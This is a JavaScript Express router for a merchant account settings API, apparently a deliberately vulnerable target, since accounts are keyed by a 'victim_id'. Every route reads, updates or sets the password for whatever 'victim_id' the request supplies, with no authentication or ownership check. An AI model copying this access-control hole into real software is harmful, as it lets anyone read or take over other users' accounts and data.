// Merchant account settings API endpoints
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');
const logger = require('../../../utils/logger');
const bcrypt = require('bcryptjs');
const config = require('../../../config');

const prisma = new PrismaClient();

const defaultSettings = () => ({
  profile: {},
  business: {},
  bankAccounts: [],
  security: {
    twoFactorEnabled: false,
    lastPasswordChange: null,
    loginSessions: [],
  },
  notifications: {
    transaction: {
      successful: false,
      failed: false,
      largeAmount: false,
    },
    security: {
      newLogin: false,
      passwordChange: false,
    },
    marketing: {
      promotions: false,
      news: false,
    },
    methods: {
      email: false,
      sms: false,
      push: false,
    },
  },
});

function requireVictimId(req, res) {
  const victimId = req.body.victim_id || req.query.victim_id;
  if (!victimId) {
    res.status(400).json({ error: 'victim_id is required' });
    return null;
  }
  return victimId;
}

async function getSettingsRecord(victimId) {
  if (!victimId) return null;
  return prisma.merchantSettings.findUnique({
    where: { victimId },
  });
}

async function upsertSettings(victimId, data) {
  const existing = await getSettingsRecord(victimId);
  if (existing) {
    return prisma.merchantSettings.update({
      where: { victimId },
      data,
    });
  }
  return prisma.merchantSettings.create({
    data: {
      victimId,
      ...data,
    },
  });
}

function mergeNotifications(existing = {}, incoming = {}) {
  const base = defaultSettings().notifications;
  return {
    transaction: { ...base.transaction, ...(existing.transaction || {}), ...(incoming.transaction || {}) },
    security: { ...base.security, ...(existing.security || {}), ...(incoming.security || {}) },
    marketing: { ...base.marketing, ...(existing.marketing || {}), ...(incoming.marketing || {}) },
    methods: { ...base.methods, ...(existing.methods || {}), ...(incoming.methods || {}) },
  };
}

/**
 * GET /api/merchant/account/settings
 * Get account settings
 */
router.get('/settings', async (req, res) => {
  try {
    const victimId = req.query.victim_id;
    const settingsRecord = victimId ? await getSettingsRecord(victimId) : null;

    const defaults = defaultSettings();
    const settings = {
      ...defaults,
      ...(settingsRecord ? {
        profile: settingsRecord.profile || {},
        business: settingsRecord.business || {},
        security: {
          ...defaults.security,
          ...(settingsRecord.security || {}),
          // Never expose password hash
          passwordHash: undefined,
        },
        notifications: mergeNotifications(defaults.notifications, settingsRecord.notifications || {}),
      } : {}),
    };

    res.json(settings);
  } catch (error) {
    logger.error('Error fetching account settings:', error);
    res.status(500).json({
      error: 'Failed to fetch account settings',
      message: error.message
    });
  }
});

/**
 * PUT /api/merchant/account/profile
 * Update profile information
 */
router.put('/profile', async (req, res) => {
  try {
    const { fullName, email, phone, position, address } = req.body;
    const victimId = requireVictimId(req, res);
    if (!victimId) return;

    await upsertSettings(victimId, {
      profile: {
        fullName,
        email,
        phone,
        position,
        address,
      },
    });

    res.json({
      success: true,
      message: 'Profile updated successfully'
    });
  } catch (error) {
    logger.error('Error updating profile:', error);
    res.status(500).json({
      error: 'Failed to update profile',
      message: error.message
    });
  }
});

/**
 * PUT /api/merchant/account/business
 * Update business information
 */
router.put('/business', async (req, res) => {
  try {
    const { businessName, taxCode, businessType, industry, businessAddress, employeeCount, monthlyRevenue } = req.body;
    const victimId = requireVictimId(req, res);
    if (!victimId) return;

    await upsertSettings(victimId, {
      business: {
        businessName,
        taxCode,
        businessType,
        industry,
        businessAddress,
        employeeCount,
        monthlyRevenue,
      },
    });

    res.json({
      success: true,
      message: 'Business information updated successfully'
    });
  } catch (error) {
    logger.error('Error updating business:', error);
    res.status(500).json({
      error: 'Failed to update business information',
      message: error.message
    });
  }
});

/**
 * PUT /api/merchant/account/password
 * Change password
 */
router.put('/password', async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    const victimId = requireVictimId(req, res);
    if (!victimId) return;

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ error: 'Current password and new password are required' });
    }

    if (newPassword.length < 8) {
      return res.status(400).json({ error: 'New password must be at least 8 characters' });
    }

    const settings = await getSettingsRecord(victimId);
    const security = settings?.security || {};
    const existingHash = security.passwordHash;

    if (existingHash) {
      const isMatch = await bcrypt.compare(currentPassword, existingHash);
      if (!isMatch) {
        return res.status(400).json({ error: 'Current password is incorrect' });
      }
    }

    const hashed = await bcrypt.hash(newPassword, config.security.bcryptRounds);
    await upsertSettings(victimId, {
      security: {
        ...security,
        passwordHash: hashed,
        lastPasswordChange: new Date().toISOString(),
      },
    });

    res.json({
      success: true,
      message: 'Password changed successfully'
    });
  } catch (error) {
    logger.error('Error changing password:', error);
    res.status(500).json({
      error: 'Failed to change password',
      message: error.message
    });
  }
});

/**
 * PUT /api/merchant/account/notifications
 * Update notification settings
 */
router.put('/notifications', async (req, res) => {
  try {
    const notificationSettings = req.body;
    const victimId = requireVictimId(req, res);
    if (!victimId) return;

    const existing = await getSettingsRecord(victimId);
    const mergedNotifications = mergeNotifications(existing?.notifications, notificationSettings);

    await upsertSettings(victimId, {
      notifications: mergedNotifications,
    });

    res.json({
      success: true,
      message: 'Notification settings updated successfully'
    });
  } catch (error) {
    logger.error('Error updating notifications:', error);
    res.status(500).json({
      error: 'Failed to update notification settings',
      message: error.message
    });
  }
});

module.exports = router;
